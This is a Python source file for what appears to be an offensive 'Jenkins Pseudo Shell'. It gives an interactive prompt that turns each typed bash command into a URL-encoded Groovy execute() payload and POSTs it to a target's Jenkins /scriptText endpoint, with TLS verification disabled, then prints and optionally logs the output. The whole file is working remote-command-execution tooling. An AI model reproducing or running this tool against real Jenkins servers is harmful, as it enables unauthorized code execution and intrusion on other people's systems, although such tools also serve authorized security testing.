import ZHOR_Modules.fileManager as fm
import ZHOR_Modules.nicePrints as np
import ZHOR_Modules.listUtils as lu
import ZHOR_Modules.osUtils as osu
import ZHOR_Modules.requestUtils as requ
import ZHOR_Modules.encodingUtils as encu   
import ZHOR_Modules.jsonUtils as jsu
import ZHOR_Modules.timestampsUtils as tsu

import termcolor
import argparse
import requests
import sys
import urllib

from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)



_VERSION = "v191224"
parser = argparse.ArgumentParser(description="Jenkins Pseudo Shell " + _VERSION)
REQUIRED_ARGUMENTS = parser.add_argument_group("Required arguments")
OPTIONAL_ARGUMENTS = parser.add_argument_group("Optional arguments")

# Required arguments
REQUIRED_ARGUMENTS.add_argument('-t',metavar='"TARGET"',type=str,required=True,help='Target host')

# Optional arguments
OPTIONAL_ARGUMENTS.add_argument('--log',action="store_true",help="Log session")
OPTIONAL_ARGUMENTS.add_argument('--debug',action="store_true",help="Debug mode")

args = parser.parse_args()

np.DEBUG = ('--debug' in sys.argv)
_config = jsu.loadConfig()

# ==================================================================================================================

#proxies = {"http": "http://127.0.0.1:8081", "https": "http://127.0.0.1:8081"}
proxies = None
LOG_PATH = f"{tsu.getTimeStamp_iso8601()}_{args.t}_{_config['user']}.log"

def makePayload(command: str):
    
    bashCommand = encu.bashEncode_command(command)
    groovyPayload = ""
    groovyPayload += "def%20sout%20%3D%20new%20StringBuilder%28%29%2C%20serr%20%3D%20new%20StringBuilder%28%29%3Bdef%20proc%20%3D%20%27"
    groovyPayload += encu.urlEncode_allSpecialCharacters(bashCommand)
    groovyPayload += "%27%2Eexecute%28%29%3Bproc%2EconsumeProcessOutput%28sout%2C%20serr%29%3Bproc%2EwaitForOrKill%281000%29%3Bprintln%28%22STDOUT%20%3E%20%24sout%5Cn%5CnSTDERR%20%3E%20%24serr%22%29"

    payload = "script=" + groovyPayload

    return payload

def makeRequest(command: str, target: str):
    URL = f"http://{target}/scriptText"
    DATA = makePayload(command)
    AUTH = (_config['user'], _config['token'])
    HEADERS = requ.requestFile2Headers('headers.txt')

    r = requests.post(url=URL,
                      data=DATA,
                      auth=AUTH,
                      headers=HEADERS,
                      verify=False,
                      proxies=proxies)

    output = r.text
    print(output)
    
    if ('--log' in sys.argv):
        log(_config['user'],target,command,output)

def log(user: str, target: str,command: str, output: str):
    lines = []
    lines.append("\n=================================================================================================================\n")
    lines.append(f"[{user}@{target}] > {command}")
    lines.append(output)

    fm.listToFile(lines,LOG_PATH,'a')
    
def prompt():

    print("[",end="")
    termcolor.cprint(_config['user'], _config['user-color'], end="")
    print("@",end="")
    termcolor.cprint(args.t, _config['target-color'], end="")
    print("] > ",end="")
    return str(input())


if __name__ == '__main__':
    
    while True:
        makeRequest(prompt(),args.t)